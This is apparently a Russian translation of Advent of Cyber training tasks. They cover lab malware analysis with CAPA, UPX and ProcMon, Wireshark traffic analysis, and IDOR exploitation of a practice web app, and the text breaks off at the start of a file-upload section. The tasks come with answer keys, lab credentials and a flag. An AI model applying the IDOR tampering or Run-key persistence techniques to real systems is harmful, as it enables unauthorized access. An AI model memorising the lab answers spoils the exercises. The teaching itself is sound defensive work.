Если бы вы проверили несколько образцов вредоносного ПО в дикой природе, то возникла бы типичная схема, которая 
делает анализ других образцов проще с опытом.  Знание этих общих поведений дает нам представление о том, что искать 
с точки зрения защиты, например:  

- `Сетевые соединения` - Вредоносное ПО имеет тенденцию устанавливать либо внешние сетевые соединения, либо внутренние 
соединения. Внешние соединения позволяют осуществлять удаленный доступ или загрузку подготовленных полезных нагрузок 
из инфраструктуры субъектов угроз. Между тем, внутренние соединения допускают боковое перемещение, технику, 
используемую для расширения доступа к другим хостам или приложениям в сети.   
- `Изменения ключей реестра` - вредоносное ПО обычно использует ключи реестра для установления устойчивости, техники, 
используемой субъектами угроз для скрытного поддержания долгосрочного доступа к системе, несмотря на сбои. Хорошим 
примером является Registry Run Keys, который позволяет автоматически запускать двоичные файлы при входе пользователя 
в систему или загрузке машины.   
- `Манипуляции с файлами` . Вредоносное ПО также имеет тенденцию загружать (одна из распространенных причин 
  установления сетевых подключений) или создавать новые файлы, необходимые для его успешного выполнения. 
Учитывая эти знания, мы можем предсказать возможное поведение вредоносного ПО во время расследования.

### Опасности анализа образцов вредоносного ПО

ПРЕДУПРЕЖДЕНИЕ : Работа с образцом вредоносного ПО опасна. Всегда принимайте меры предосторожности при его анализе. 

В связи с этим вот несколько полезных советов по борьбе с активным вредоносным ПО: Криминалист МакБлю спешит на помощь!

Всегда предполагайте, что образцы вредоносного ПО заразят ваше устройство; поэтому их запуск не всегда является 
первым и единственным шагом в анализе. 
Запускайте образец вредоносного ПО только в контролируемой среде, которая предотвращает потенциальную компрометацию 
нежелательных активов. 
Всегда рекомендуется иметь собственную  «песочницу», которая позволит вам без проблем запускать образцы вредоносного ПО.
Песочница — это контролируемая тестовая среда, которая имитирует легитимную рабочую среду конечного пользователя. 
Она предоставляет аналитикам безопасную среду для запуска образцов вредоносных программ и изучения их поведения. 
Наконец, наличие готовой песочницы не позволяет аналитикам запускать образцы вредоносных программ на своих рабочих 
станциях, что крайне опасно и непрактично из-за возможности нежелательного воздействия.

В типичной конфигурации песочницы также предоставляют аналитикам по безопасности автоматизированный анализ для 
определения того, требует ли двоичный файл из набора образцов вредоносного ПО дальнейшего ручного исследования. 

Для этой задачи вы можете запустить присоединенный экземпляр FlareVM, нажав кнопку Start Machine. Эта VM будет 
служить вам в качестве песочницы. Однако не ждите, что эта машина обеспечит автоматизированный анализ, поскольку мы 
поможем Forensic McBlue в проведении ручного анализа.   

Примечание: если виртуальная машина не отображается, используйте синюю кнопку «Показать разделенный вид» в правом 
верхнем углу страницы. 

Вы можете использовать следующие учетные данные для альтернативного доступа через удаленный рабочий стол (RDP):


Статический и динамический анализ

Мы поняли предпосылки, необходимые для безопасной обработки вредоносного ПО из предыдущего раздела.  Теперь давайте 
быстро освежим в памяти два метода анализа вредоносного ПО. 

Статический анализ — это способ анализа образца вредоносного ПО без выполнения кода. Этот метод в основном 
фокусируется на профилировании двоичного файла с его читаемой информацией, такой как его свойства, поток программы и 
строки. Учитывая ограничение, связанное с его невыполнением, иногда этот метод дает недостаточно информации, поэтому 
мы прибегаем к динамическому анализу .

Между тем, динамический анализ  в основном фокусируется на понимании вредоносного ПО путем его запуска в безопасной 
среде, например, в песочнице. Сделав это, вы увидите вредоносное ПО в действии, его точное поведение и то, как оно 
заражает среду.  

Профилирование исполняемых файлов с помощью статического анализа

Как обсуждалось выше, перед тем как вставить образец вредоносного ПО в$Desktop\Malware Sample Давайте проведем статический анализ двоичного файла  mysterygift.

### Образец вредоносного ПО.

Для этого упражнения мы в основном будем использовать следующие инструменты:  Detect It Easy и CAPA.

### Легко обнаружить

Щелкните правой кнопкой мыши образец и запустите  Detect It Easy (DIE). Этот инструмент предоставляет информацию о 
файле, такую как его архитектура, значимые заголовки, используемый упаковщик и строки. В этой задаче мы будем 
использовать только базовые функции Detect It Easy, чтобы получить основную информацию, необходимую для анализа 
двоичного файла. Если вы хотите узнать больше об этом инструменте, вы можете перейти по этой ссылке.   

Легко обнаружить.

При открытии мы сразу же обнаружим архитектуру двоичного файла и используемый упаковщик исполняемого файла.

Упаковка вредоносного ПО — это распространенная техника, используемая разработчиками вредоносного ПО для сжатия, 
обфускации или шифрования двоичного файла. При этом содержимое, такое как значимые строки и заголовки, не будет 
сразу видно инструментам статического анализа .  

Вы можете проверить эту информацию, выполнив следующие действия:

Просмотрите строки из Detect It Easy, которые показывают подавляющее количество строк, не представляющих особой важности для расследования.
Примечание: строки — это фрагменты текста внутри двоичного файла, часто содержащие такую информацию, как IP-адреса, 
URL-адреса или имена файлов, используемые вредоносной программой.   
Легко обнаружить (2).

Запустите CAPA, который покажет, что двоичный файл в основном скрывает свою логику, а анализ затронут из-за упаковщика.
### КАПА
CAPA обнаруживает возможности в исполняемых файлах. Это может быть установка службы, вызов сетевых подключений, 
изменение реестра и т. д. 

Чтобы начать работу с CAPA, запустите командную строку, расположенную на панели задач, и перейдите в каталог 
образцов вредоносного ПО, как показано ниже. 

Панель задач CMD.
```commandline
cmd.exe
C:\Users\Administrator>cd "Desktop\Malware Sample"
C:\Users\Administrator\Desktop\Malware Sample>capa mysterygift
loading : 100%|████████████████████████████████████████████████████████████| 485/485 [00:00<00:00, 1633.69     rules/s]
matching: 100%|██████████████████████████████████████████████████████████████████| 3/3 [00:02<00:00,  1.11 functions/s]
WARNING:capa:--------------------------------------------------------------------------------
WARNING:capa: This sample appears to be packed.
WARNING:capa:
WARNING:capa: Packed samples have often been obfuscated to hide their logic.
WARNING:capa: capa cannot handle obfuscation well. This means the results may be misleading or incomplete.
WARNING:capa: If possible, you should try to unpack this input file before analyzing it with capa.
WARNING:capa:
WARNING:capa: Use -v or -vv if you really want to see the capabilities identified by capa.
WARNING:capa:--------------------------------------------------------------------------------
```

Учитывая вывод CAPA, мы обнаружили, что образец вредоносного ПО упакован. Вы также могли видеть ранее из Detect It 
Easy, что двоичный файл упакован UPX. 

Результат упаковщика Detect It Easy.

Итак, теперь давайте распакуем двоичный файл с помощью  UPX  и повторно проанализируем двоичные файлы с помощью  CAPA.
```commandline
cmd.exe
C:\Users\Administrator\Desktop\Malware Sample>upx -d mysterygift
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96w       Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    502169 <-    227737   45.35%    win64/pe     mysterygift

Unpacked 1 file.
cmd.exe
C:\Users\Administrator\Desktop\Malware Sample>del mysterygift.viv
C:\Users\Administrator\Desktop\Malware Sample>capa mysterygift
```

Вы можете заметить, что CAPA теперь предоставила важную информацию об образце вредоносного ПО.

Примечание: Мы выполнили  del mysterygift.viv удаление кэшированных результатов первого выполнения CAPA. Удаляя файл 
viv, CAPA повторно анализирует двоичный файл с точными результатами. 

Имея предварительные, хотя и ограниченные знания об образце вредоносного ПО, давайте проведем более детальное 
исследование, проведя динамический анализ! 

Глубокое погружение в динамический анализ вредоносного ПО

Вы могли заметить, что мы не можем выполнить двоичный файл после двойного щелчка по нему, так как его расширение 
файла не является.exe. 

Прежде чем переименовывать и запускать двоичный файл, давайте подготовим инструмент, который нам нужен для анализа 
его поведения - ProcMon. ProcMon, или Process Monitor, - это инструмент Windows, который в реальном времени 
показывает реестр, файловую систему и активность процессов/потоков. Узнать больше о нем можно здесь . Вы можете 
получить к нему доступ через панель задач рядом с cmd.exe.   

### Инструменты панели задач.

После открытия вам будет предложено Process Monitor Filter —  функция, которая позволяет нам фильтровать результаты, 
зарегистрированные ProcMon. В этом случае мы хотим сосредоточиться только на событиях, сгенерированных  mysterygift.
exe процесс. Давайте установим условиеProcess Name - is - mysterygift.exe ; добавьте фильтр и нажмите «ОК» , чтобы 
закрыть запрос.    

### Фильтры ProcMon.

Теперь подготовим образец вредоносной программы к выполнению и переименуем его в mysterygift.exe.
```commandline
cmd.exe
C:\Users\Administrator\Desktop\Malware Sample>mv mysterygift mysterygift.exe
```

Теперь мы готовы вытащить вредоносное ПО. Перейдите в папку Malware Sample, дважды щелкните двоичный файл и 
посмотрите результаты, сгенерированные ProcMon. Сначала это может показаться ошеломляющим, но давайте воспользуемся 
его функциональными возможностями, чтобы показать только нужную нам информацию.  

ProcMon имеет панель, которая может фильтровать следующее, как показано на изображении ниже (в последовательности):
- Показать активность реестра
- Показать активность файловой системы
- Показать сетевую активность
- Показать активность процессов и потоков
- Показать профилирующие события

### Панель фильтров ProcMon.

С помощью этих фильтров мы сосредоточимся на первых трех: Реестр, Файловая система и Сеть. Как обсуждалось выше, 
вредоносное ПО, как правило, делает следующее:  Изменение реестра, Изменение файлов и Сетевые подключения . Давайте 
начнем исследовать их по одному.  

### Изменение реестра

Во-первых, мы хотим определить, выполняет ли двоичный файл какие-либо существенные изменения реестра, что является 
одним из ожидаемых поведений, представленных в этой задаче. 

Для этого снимите все фильтры и выберите только Show Registry Activity . Результаты по-прежнему дают несколько 
результатов, поэтому давайте добавим фильтр, найдя все создания и изменения ключей реестра. Удалите следующие 
операции, щелкнув правой кнопкой мыши запись в столбце Operation и выбрав Exclude '<operation (eg RegQueryKey)>', 
как на изображении ниже:   
```commandline
RegOpenKey
RegQueryValue
RegQueryKey
RegCloseKey
```

Исключить фильтр.

Просмотр из ProcMon должен выдать меньше результатов, как показано на изображении ниже.

Фильтр реестра ProcMon.

Вы можете заметить, что только один ключ реестра имеет и RegCreateKey  , и RegSetValue . Этот ключ связан с техникой 
сохранения, называемой Registry Run Key Modification , и обычно используется разработчиками вредоносных программ для 
установки бэкдора.   

### Изменение файла

Теперь давайте также определим, выполняет ли образец вредоносного ПО File Creations. Это может означать, что 
вредоносное ПО сбрасывает файлы предварительных условий для своего успешного выполнения.  

Снимите все фильтры и выберите второй фильтр - Show File System Activity . Опять же, результатов все еще много, 
поэтому давайте добавим дополнительные фильтры, сосредоточившись только на событиях  File Write . Удалите следующие 
операции снова, щелкнув правой кнопкой мыши запись в столбце Operation и выбрав Exclude '<operation (eg CreateFile)>':


Просмотр из ProcMon должен выдать меньше результатов, как показано на изображении ниже.

Фильтр файловой системы ProcMon.

Вы можете заметить, что два файла записаны в  каталоге  C:\Users\Administrator  . Первый файл находится в каталоге 
пользователя TEMP , который обычно используется вредоносным ПО для сброса другого файла для его утилизации. Другой 
файл записан в каталоге STARTUP  , также используемый для сохранения через папки автозагрузки .  

Сетевые соединения

Наконец, давайте подтвердим, пытается ли образец вредоносного ПО установить сетевое соединение. Это может означать, 
что вредоносное ПО взаимодействует с внешними ресурсами для загрузки или установления удаленного доступа. 

Снимите все фильтры и выберите третий фильтр -  Показать сетевую активность .  В отличие от предыдущих фильтров, 
результаты немногочисленны и их можно легко интерпретировать. 

Сетевой фильтр ProcMon.

Пожалуйста, обратите внимание на эти домены, так как мы можем использовать эту информацию для дальнейшего 
исследования «кроличьей норы». 

### Заключение

Мы рассмотрели несколько тем по этой задаче об анализе вредоносных программ. Для краткого резюме, мы узнали следующее:

- Ключевые особенности поведения вредоносных программ помогают получить общее представление о том, чего следует 
ожидать при изучении образцов вредоносных программ. 
- Меры предосторожности, которые необходимо соблюдать при работе с образцами вредоносного ПО, и важность «песочниц».
- Проведите статический анализ и профилируйте характер двоичного файла, не выполняя его. 
- Выполните ручной динамический анализ и проследите за взаимодействием образца вредоносного ПО в  реестре , файловой 
  системе и сети .
- Наконец, завершите расследование, ответив на вопросы нашего руководства по расследованию ниже и помогая эксперту 
  МакБлю!

### Ответить на вопросы ниже
Какова архитектура образца вредоносного ПО? (32-бит/64-бит)
```commandline
64-bit
```
Какой упаковщик используется в образце вредоносного ПО? (формат: строчные буквы)
```commandline
upx
```
Какой компилятор использовался для сборки образца вредоносного ПО?  (формат: строчные буквы)
```commandline
nim
```
Сколько методов MITRE ATT&CK было обнаружено применительно к тактике DISCOVERY?
```commandline
2
```
Какой раздел реестра использует вредоносная программа?
```commandline
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```
Какое значение записано в разделе реестра, исходя из предыдущего вопроса?
```commandline
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wishes.bat
```
Каковы имена двух файлов, созданных вредоносной программой в  каталоге C:\Users\Administrator\  ? (формат: file1,file2 в алфавитном порядке)
```commandline
test.jpg,wishes.bat
```
Назовите два домена, в которых вредоносное ПО инициировало сетевое соединение? (формат: домен1, домен2 в алфавитном порядке)
```commandline
bestfestivalcompany.thm,virustotal.com
```
Возвращаясь к строкам внутри образца вредоносного ПО, какой полный URL-адрес используется для загрузки файла, размещенного в первом домене, к которому обратилась вредоносная программа?
```commandline
http://bestfestivalcompany.thm/favicon.ico
```
Если вам понравился анализ вредоносных программ, попробуйте  следующие разделы «Введение в анализ вредоносных программ»  или  «Диссектинг заголовков PE»  ! 
```commandline
Ответ не нужен
```

## Задание 18
Посмотрите видеообзор SecurityNinja для 13-го дня  здесь !

После получения фишингового письма на 6-й день и расследования вредоносного ПО на 12-й день, казалось, что все 
готово вернуться в нормальное русло. Однако системы мониторинга начали показывать подозрительные шаблоны трафика как 
раз перед закрытием дела. Теперь команде SOC Санты нужна помощь в анализе этих подозрительных сетевых шаблонов.  

### Цели обучения

- Узнайте, что такое анализ трафика и почему он по-прежнему важен.
- Изучите основы анализа трафика.
- Изучите основные функции Wireshark, используемые при расследовании дел.
- Узнайте, как оценивать закономерности и выявлять аномалии в сети.
- Научитесь использовать дополнительные инструменты для выявления вредоносных адресов и проведения дальнейшего анализа.
- Помогите команде Elf расследовать подозрительные схемы движения.
### Пакеты и анализ пакетов?

Пакеты — это самая базовая единица сетевых данных, передаваемых по сети. Когда сообщение отправляется с одного хоста 
на другой, оно передается небольшими порциями; каждая из них называется пакетом. Анализ пакетов — это процесс 
извлечения, оценки и идентификации сетевых шаблонов, таких как соединения, общие ресурсы, команды и другие сетевые 
действия, такие как входы в систему и сбои системы, из предварительно записанных файлов трафика.    

### Почему анализ пакетов все еще важен?

Сетевой трафик — это чистый и богатый источник данных. Захват пакетов ( PCAP ) сетевых событий обеспечивает богатый 
источник данных для анализа. Захват данных в реальном времени может быть сосредоточен на потоке трафика, который 
предоставляет только статистику по сетевому трафику. С другой стороны, выявление и глубокое исследование сетевых 
шаблонов выполняется на уровне пакетов. Следовательно, обнаружение угроз и устранение неполадок производительности в 
реальном времени не могут быть выполнены без анализа пакетов.    

Сегодня большинство сетевых механизмов обнаружения и систем оповещения принимают и анализируют информацию на уровне 
пакетов для создания оповещений и статистических данных. Кроме того, большинство упражнений по объединению 
red/blue/purple оптимизированы с помощью анализа на уровне пакетов. Наконец, даже закодированные/зашифрованные 
сетевые данные по-прежнему представляют ценность, указывая на странный, необычный или неожиданный шаблон или 
ситуацию, подчеркивая, что анализ пакетов по-прежнему важен.    

### Что следует учитывать при работе с PCAP

Перед проведением анализа пакетов следует рассмотреть различные моменты. Ниже перечислены основные моменты.



Когда придет время делать "анализ на уровне пакетов", может показаться, что трудно  реализовать теорию на практике. 
Но создание "контрольных списков" и "мини-плейбуков" значительно упростит процесс анализа. Ниже показан простой 
контрольный список процесса для практического анализа пакетов.   

### Что такое Wireshark и как его использовать?

Wireshark — это стандартный инструмент для анализа сетевых протоколов, который необходим при любом исследовании 
трафика и пакетов. С его помощью можно просматривать, сохранять и разбивать сетевой трафик. Узнать больше о 
Wireshark можно, завершив модуль Wireshark .  

Ниже показана быстрая демонстрация инструмента для фундаментального анализа. Теперь нажмите кнопку Start Machine в 
верхней части задачи, чтобы запустить виртуальную машину . Машина запустится в режиме разделенного экрана. Если  
виртуальная машина  не видна, используйте синюю кнопку Show Split View в правом верхнем углу страницы.  

После запуска данной виртуальной машины откройте Wireshark и пройдите пошаговое руководство ниже.  После двойного 
щелчка по файлу PCAP он загрузится в инструмент. В качестве альтернативы вы можете открыть инструмент, перетащить 
файл или использовать меню «Файл» .   

### Файл Wireshark открыт

После первого открытия файла pcap может показаться сложным решить, на чем сосредоточиться. Разбивка всех пакетов в 
виде дерева упростит анализ. Статистика покажет общее использование портов и служб, поэтому будет немного проще 
увидеть общую картину в файле захвата.  

Используйте  меню «Статистика --> Иерархия протоколов»  для просмотра общего использования портов и служб.
Теперь посмотрим на вывод. Большая часть трафика идет по TCP и HTTP : 

### Иерархия протокола Wireshark

Вы также можете просматривать соединения по протоколам  IP и TCP/ UDP , чтобы увидеть общее использование портов и 
служб (включая общее количество пакетов, переданных через определенный порт и между двумя хостами).  Следующий шаг — 
просмотр IP-диалогов, чтобы обнаружить, не используется ли странный/подозрительный/необычный IP-адрес.  

Закройте окно иерархии протоколов, используйте  раздел «Статистика --> Диалоги» и перейдите в раздел IPv4,  чтобы просмотреть список IP-диалогов. 
Примечание:  Перейдите в разделы TCP/ UDP , чтобы просмотреть сведения о сеансе связи TCP/ UDP .

### Разговоры Wireshark

Теперь у нас есть подробный список IP-адресов, номеров портов и количества пакетов, переданных с одной конечной 
точки на другую. Эта информация поможет нам идентифицировать подозрительные IP-адреса, соединения и порты. Тщательно 
проанализируйте детали; мы можем обнаружить IP-адреса и службы, используемые Bandit Yeti APT !  

Давайте проанализируем результаты в этом разделе; перейдите к части TCP и посмотрите на результаты, порт 80 
используется как среда связи в TCP. Порт 80 представляет службу HTTP . Далее вы можете увидеть, что служба DNS также 
используется, перейдя в раздел UDP . Теперь у нас есть два целевых протокола для анализа.  Прежде чем продолжить 
анализ конкретного протокола, вы должны были выполнить  следующие проверки и ответить на некоторые вопросы анализа.    


Теперь давайте сосредоточимся на HTTP и DNS.  По сути, все, что передается по этим протоколам, является открытым 
текстом.  На этом этапе фильтрация пакетов DNS для просмотра взаимодействующих доменов — это хорошее начало перед 
глубоким погружением в данные открытого текста.  

Закройте окно статистики и введите текст в строку поиска, чтобы применить  фильтр и просмотреть DNS- пакеты.DNS 
Пакеты DNS помогут нам идентифицировать адреса подключенных доменов, чтобы решить, связаны ли они с подозрительной 
угрозой и Bandit Yeti APT !  Щелкните по первому пакету и используйте нижнюю левую часть инструмента (панель 
сведений о пакете), чтобы просмотреть сведения о пакете. Есть несколько свернутых разделов; щелкните по разделу, 
Domain Name System чтобы развернуть и просмотретьDNSпакетов. Есть дополнительные свернутые разделы под 
соответствующим разделом; разверните их, чтобы просмотреть все доступные сведения. Вы найдете взаимодействующий 
домен под queries разделом. Смотрите пример ниже и продолжайте анализ, проанализировав все доступныепакетыDNS      

### Wireshark DNS-фильтр

Прежде чем продолжить анализ HTTP ,  убедитесь, что вы выполнили следующие проверки и ответили на вопросы анализа.

Используйте HTTPфильтр для фильтрации и просмотра HTTP- пакетов.
Нажмите на первый пакет и просмотрите подробности. В HTTP "GET Request " используется клиентом для отправки запроса 
на сервер. Обычно этот запрос заканчивается получением данных/ресурсов. Поэтому мы рассмотрим эти запросы, чтобы 
увидеть, запрашивается ли какая-либо конечная точка для ресурса с других серверов по протоколу HTTP .   

Примените фильтр и разверните Hypertext Transfer Protocolраздел. Разверните также подразделы и сосредоточьтесь на 
запросах GET. Запрошенные пути ресурсов вы найдете в разделе Full Request URI. Кроме того, вы можете оценить 
user-agentраздел, чтобы проверить, есть ли аномальная или нестандартная информация о user-agent. Посмотрите пример 
ниже и продолжите анализ, проанализировав все доступные HTTP- пакеты.   

### Фильтр http Wireshark

Прежде чем перейти к следующим шагам,  убедитесь, что вы выполнили следующие проверки и ответили на вопросы анализа.

...
### Ответить на вопросы ниже
Просмотр меню «Иерархия протоколов».

Каково значение «Процент пакетов» для «Протокола передачи гипертекста»?
```commandline
0.3
```
Просмотреть «Беседы».
Перейти в раздел TCP.

Какой номер порта получил более 1000 пакетов?
```commandline
3389
```
Каково имя службы используемого протокола, который получил более 1000 пакетов?
```commandline
RDP
```
Фильтровать DNS-пакеты.

Какие доменные имена?
Введите домены  в  алфавитном  порядке  и  в формате без фантомов . ( формат: домен[.]zzz,домен[.]zzz )

```commandline
bestfestivalcompany[.]thm,cdn[.]bandityeti[.]thm
```
Фильтрация HTTP-пакетов.

Каковы имена запрашиваемых файлов?
Введите имена в  алфавитном порядке  и  в  формате без символов.  (формат: file[.]xyz,file[.]xyz)
```commandline
favicon[.]ico,mysterygift[.]exe
```
Какой IP-адрес скачал исполняемый файл?
Введите ответ в  очищенном  формате.
```commandline
10[.]10[.]29[.]186
```
На каком доменном адресе размещен вредоносный файл?
Введите свой ответ в  обезвреженном  формате.
```commandline
cdn[.]bandityeti[.]thm
```
Какое значение «user-agent» используется для загрузки неисполняемого файла?
```commandline
Nim httpclient/1.6.8
```
Экспорт объектов из файла PCAP.
Рассчитать хэши файлов.

Каково хэш-значение sha256 исполняемого файла?
```commandline
0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f
```
Найдите значение хэша исполняемого файла на VirusTotal.
Перейдите в раздел «Поведение».
С этим файлом связано несколько IP-адресов.

Мы знаем, что IP-адреса, начинающиеся с 20[.] и 23[.], связаны с Bandit Yeti APT.
Каковы подключенные IP-адреса в указанном шаблоне?
Введите IP-адрес  без ошибок  и в  числовом порядке .  (формат: IPADDR,IPADDR)


Обратите внимание, что запись VT изменилась с момента записи официального видео-прохождения — проверьте веб-сайт VT, 
чтобы получить все необходимые IP-адреса!  
```commandline
20[.]99[.]133[.]109,20[.]99[.]184[.]37,23[.]216[.]147[.]64,23[.]216[.]147[.]76
```
Если вам понравилось работать с Wireshark, у нас есть комплексный модуль по этому полезному инструменту  здесь . 
Если вы хотите погрузиться глубже,  модуль Network Security and Traffic Analysis  ждет вас!  

```commandline
Ответ не нужен
```

## Задание 19
Посмотрите видео-обучение Филлипа Уайли к 14-му дню  здесь !

Elf McSkidy потягивала кофе, когда увидела в своем календаре, что пришло время пересмотреть безопасность 
веб-приложения. Внутреннее веб-приложение разрабатывается для внутреннего использования и управления командой 
кибербезопасности. Она звонит Elf Exploit McRed и просит его проверить веб-приложение, находящееся в разработке, на 
наличие распространенных уязвимостей.  Elf Exploit McRed обнаруживает, что локальное веб-приложение страдает от 
уязвимости Insecure Direct Object References (IDOR).

### Цели обучения
- Веб-приложения
- Открытый проект безопасности веб-приложений ( OWASP ) Топ-10
- ИДОР

### Веб приложение
Веб-приложение — это часть программного обеспечения, которое мы можем использовать через веб-браузер. В отличие от 
компьютерных программ и приложений для смартфонов, веб-приложение не требует установки на систему пользователя для 
его использования. Для использования веб-приложения нам нужен только веб-браузер, например Firefox, MS Edge, Google 
Chrome или Safari.   

Для пользователя есть много преимуществ. Поскольку ему нужен только веб-браузер, пользователь может получить доступ 
к веб-приложению из системы Microsoft Windows, компьютера Mac или системы Linux . Если пользователь может 
использовать современный веб-браузер, он может получить доступ к веб-приложению. Он сможет увидеть тот же интерфейс 
и насладиться очень похожим опытом даже с разными системами. Он даже может получить доступ к тому же веб-приложению 
из веб-браузера на своих смартфонах, и его опыт будет зависеть только от размера экрана и того, что он может 
вместить.     

Более того, есть много преимуществ для разработчика программного обеспечения. Вместо того, чтобы разрабатывать 
приложение для macOS, другое для MS Windows и третье для ChromeOS, им нужно создать только одно веб-приложение и 
убедиться, что оно совместимо с различными современными браузерами.   

Ниже приведены некоторые примеры популярных веб-приложений:

- Веб-почта: примеры включают Tutanota, ProtonMail, StartMail и Gmail.
- Интернет-магазины: вот некоторые примеры: Etsy, Amazon, eBay и AliExpress.
- Интернет-банкинг: Современные банки все чаще позволяют клиентам осуществлять банковские операции через веб-браузер.
- Пакет онлайн-офисов: рассмотрим, например, Microsoft Office 365, Zoho Office и Google Drive.
По мере развития веб-технологий количество и типы веб-приложений продолжают расти.

### База данных
При обсуждении веб-приложений необходимо упомянуть системы баз данных. Многим веб-приложениям необходим доступ к 
огромным объемам данных. Даже самое простое веб-приложение для онлайн-покупок требует сохранения информации о 
доступных продуктах, данных о клиентах и покупках. Мы должны найти решение для хранения такой информации и 
эффективного чтения и записи в существующие данные. Ответ заключается в использовании системы баз данных.   

Существуют две популярные модели баз данных:
- Реляционная база данных: хранит данные в таблицах. Таблицы могут обмениваться информацией. Рассмотрим простой 
пример с тремя таблицами: products, customer_details, и purchases. purchases Таблица будет использовать информацию из 
  products таблицы.
- Нереляционная база данных: это любая база данных, которая не использует таблицы. Она может хранить данные в 
  документах и узлах графа, среди прочих типов.
Как правило, веб-приложению необходимо постоянно обращаться к базе данных, например, для поиска информации, 
  добавления новых записей или обновления существующих. 

### Контроль доступа
Рассмотрим случай, когда вы используете интернет-магазин как покупатель. После успешного входа в систему вы должны 
иметь возможность просматривать доступные продукты и проверять детали и цены продуктов, среди прочего. В зависимости 
от интернет-магазина вы можете добавить вопрос или отзыв о продукте; однако, как покупатель, вы не должны иметь 
возможности изменять цену или детали. Это связано с контролем доступа.   

Контроль доступа — это элемент безопасности, который определяет, кто может получить доступ к определенной информации 
и ресурсам. После аутентификации (рассматриваемой в День 5) контроль доступа обеспечивает соответствующий уровень 
доступа. В примере с интернет-магазином продавец должен иметь возможность обновлять цены или описания своих 
продуктов. Однако он не должен иметь возможности изменять информацию, связанную с другими продавцами. С другой 
стороны, покупатель должен иметь возможность просматривать, но не должен иметь возможности изменять данные.     

Однако из-за различных ошибок программирования или проектирования контроль доступа иногда не осуществляется должным образом.

### Уязвимости веб-приложений
OWASP был создан для улучшения безопасности программного обеспечения. Список OWASP Top 10 направлен на повышение 
осведомленности о распространенных проблемах безопасности, которые мешают веб-приложениям. Этот список поможет 
разработчикам программного обеспечения избегать распространенных ошибок для создания более безопасных продуктов. 
Другие пользователи, такие как тестировщики на проникновение и охотники за ошибками, могут использовать этот список 
в своих целях.    

IDOR относится к ситуации, когда пользователь может манипулировать входными данными, чтобы обойти авторизацию из-за 
плохого контроля доступа. IDOR был четвертым в списке OWASP Top 10 в 2013 году, прежде чем был опубликован в разделе 
Broken Access Control в 2017 году. Чтобы узнать больше об IDOR , рассмотрите следующие примеры.   

Предположим, что пользователь ID  132перенаправляется на следующий URL после входа в систему: http://santagift.
shop/account/user_id=132. Однако вскоре он обнаруживает, что может просматривать профили других пользователей, 
изменяя значение user_idс 132на другие значения, которые, как ожидается, соответствуют существующим идентификаторам 
пользователей. Хотя система должна отказать им в доступе к новому URL из-за отсутствия авторизации, уязвимость IDOR 
позволит пользователю отображать такие неавторизованные страницы. На рисунке ниже пользователь сумел получить доступ 
к странице учетной записи пользователя с ID 101.     

Рисунок, демонстрирующий уязвимость IDOR при изменении идентификатора пользователя в URL

Рассмотрим пример, когда запрос счета-фактуры генерирует ссылку, похожую на эту: http://santagift.shop/invoices?
download=115. Для проверки уязвимостей можно заменить 115другим номером, как показано на рисунке ниже. Система 
уязвима, если она позволяет им получать доступ к счетам других пользователей.  

Рисунок, демонстрирующий уязвимость IDOR при изменении идентификатора загружаемого файла в URL

Влияние уязвимости IDOR может позволить вам сбросить пароль другого пользователя. Например, после входа в систему 
злоумышленник может начать с URL-адреса, чтобы изменить свой пароль, и заменить свое имя пользователя на имя другого 
пользователя. Например, злоумышленник заменит свое имя пользователя yetiв URL-адресе http://santagift.
shop/account/changepassword=yetiна другое допустимое имя пользователя и попытается изменить свой пароль, как 
показано на рисунке ниже. Влияние уязвимости IDOR может быть высоким.    

Рисунок, демонстрирующий уязвимость IDOR для сброса пароля пользователя путем изменения имени пользователя в URL-адресе

### Эксплуатация уязвимости IDOR
Чтобы запустить AttackBox и присоединенную виртуальную машину ( VM ), нажмите кнопку «Запустить AttackBox» и нажмите 
кнопку «Запустить машину». Пожалуйста, подождите пару минут, чтобы вы могли следить за всем происходящим. 

На AttackBox запустите браузер Firefox и откройте URL http://MACHINE_IP:8080. Эта ссылка должна показать вам 
страницу входа. McSkidy предоставил нам следующие учетные данные для тестирования веб-приложения: 

Имя пользователя:mcskidy
Пароль:devtest

После проведения некоторых тестов Elf Exploit McRed смог обнаружить несколько уязвимостей IDOR . После входа в 
систему пользователь может получить доступ к страницам профилей других пользователей. Более того, доступ к файлам 
можно получить, угадывая их порядковый номер.  

### Ответить на вопросы ниже
Какой номер офиса Elf Pivot McRed?
134
```commandline
Ответ не нужен
```
Уязвимы не только страницы профилей, но и сохраненные изображения. Начните с URL-адреса допустимого изображения профиля; что такое скрытый флаг?

THM{CLOSE_THE_DOOR}
```commandline
Ответ не нужен
```
Вам нравится IDOR? Это классика Advent of Cyber! Если хотите больше, посмотрите специальную  комнату  или  испытание Corridor  . 
```commandline
Ответ не нужен
```

## Задание 20
Посмотрите видеообзор InsiderPhD на 15-й день  здесь !

Проверка входных данных

Недостаточная проверка ввода является одной из самых больших проблем безопасности для веб-приложений. Проблема 
возникает, когда вводимые пользователем данные изначально доверяются приложением. Поскольку вводимые пользователем 
данные также могут контролироваться злоумышленником, мы можем видеть, как это неотъемлемое доверие может привести ко 
многим проблемам. Несколько уязвимостей веб-приложений, такие как SQL -инъекция, межсайтовый скриптинг и 
неограниченная загрузка файлов, возникают из-за проблемы недостаточной проверки ввода пользователем. В этой задаче 
мы рассмотрим, как недостаточная проверка ввода может привести к уязвимости неограниченной загрузки файлов.     

### Цели обучения

- Проверка входных данных функциональности загрузки файлов
- Уязвимости неограниченной загрузки файлов
- Фишинг через загрузку файлов
- Как правильно защитить функцию загрузки файлов

### Неограниченные возможности неограниченной загрузки файлов

Возможность загрузки файлов на сервер стала неотъемлемой частью того, как мы взаимодействуем с веб-приложениями. 
Просто подумайте о загрузке файлов, например, о фотографии профиля для веб-сайта социальной сети, отчете, 
загружаемом в облачное хранилище, или о сохранении проекта на GitHub; приложения для функций загрузки файлов 
безграничны.   

К сожалению, при неправильном обращении загрузка файлов также может открыть серьезные уязвимости на сервере. Это 
может привести к чему угодно: от относительно незначительных неприятных проблем; вплоть до полного удаленного 
выполнения кода ( RCE ), если злоумышленнику удастся загрузить и выполнить оболочку. Имея неограниченный доступ для 
загрузки на сервер (и возможность извлекать данные по своему желанию), злоумышленник может испортить или иным 
